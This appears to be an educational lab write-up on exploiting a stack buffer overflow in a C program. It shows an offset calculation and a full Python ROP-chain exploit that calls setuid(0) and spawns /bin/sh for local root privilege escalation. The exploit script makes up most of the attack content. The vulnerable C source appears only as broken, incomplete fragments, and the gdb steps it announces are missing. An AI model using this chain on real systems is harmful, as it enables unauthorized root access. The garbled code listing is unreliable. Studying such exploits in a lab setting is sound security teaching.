OBJECTIVE

The following source code will be used throughout the development of this laboratory:

int main(int argc, char *argv[]){
        if(argc<2){

        char *content = (char *)malloc(SIZE * sizeof(char));

                if (ch == EOF){
                        if (feof(file_1)){
                                printf("End of file reached.\n");

                                perror("Error reading the file.");

                content[i] = (char)ch; i++;

Vulnerability: The memcpy(buffer, content, string_size) function copies data without checking boundaries, allowing the 233-byte buffer to overflow.

OFFSET CALCULATION

The difference between the address of the $rbp register (0x7fffffffe260) and the start address of the buffer (0x7fffffffe170) is 0xF0, which is equivalent to 240 bytes in decimal.

If we additionally consider the 8 bytes corresponding to the size of the $rbp register, we obtain a total offset of:

Offset = 240 + 8 = 248 bytes

This is the number of bytes required before overwriting the $rip register, which would allow control over the program's execution flow.

setuid Address

At this point, it is possible to build the exploit; however, it would not directly allow privilege escalation to root.

Important: This is because, in order to achieve execution with superuser privileges, it is necessary to first invoke the function setuid(0), where the parameter 0 indicates that the process must continue execution with root privileges.
Therefore, it is necessary to identify the address of the setuid function, as well as prepare the $rdi register with the value 0 before invoking it. To accomplish this objective, we proceed with the following actions from the gdb debugger:

PYTHON EXPLOIT

exploit1.py - Root Privilege Escalation with setuid(0)

#!/usr/bin/python3
from struct import pack
import sys

test = b""
test += b'\x41' * 248  # offset

rip = b''

#  SETUID(0) 
rip += pack('<Q', 0x00007ffff7df1145) # pop rdi ; ret
rip += pack('<Q', 0x0000000000000000) # rdi = 0 (UID root)
rip += pack('<Q', 0x00007ffff7ebfbe0) # llamar a setuid

#  ESCRIBIR "/bin/sh" EN .data 
rip += pack('<Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
rip += pack('<Q', 0x00007ffff7fac000) # @ .data
rip += pack('<Q', 0x00007ffff7e0ac43) # pop rax ; ret
rip += b'/bin//sh'
rip += pack('<Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret

#  NULL TERMINATOR 
rip += pack('<Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
rip += pack('<Q', 0x00007ffff7fac008) # @ .data + 8
rip += pack('<Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret
rip += pack('<Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret

#  EXECVE("/bin/sh") 
rip += pack('<Q', 0x00007ffff7df1145) # pop rdi ; ret
rip += pack('<Q', 0x00007ffff7fac000) # @ .data
rip += pack('<Q', 0x00007ffff7df2aa9) # pop rsi ; ret
rip += pack('<Q', 0x00007ffff7fac008) # @ .data + 8
rip += pack('<Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
rip += pack('<Q', 0x00007ffff7fac008) # @ .data + 8
rip += pack('<Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret

rip += pack('<Q', 0x00007ffff7e0ac43) # pop rax ; ret
rip += pack('<Q', 0x000000000000003b) # rax = 0x3b (execve)
rip += pack('<Q', 0x00007ffff7def505) # syscall

sys.stdout.buffer.write(test + rip + b'\x0a')
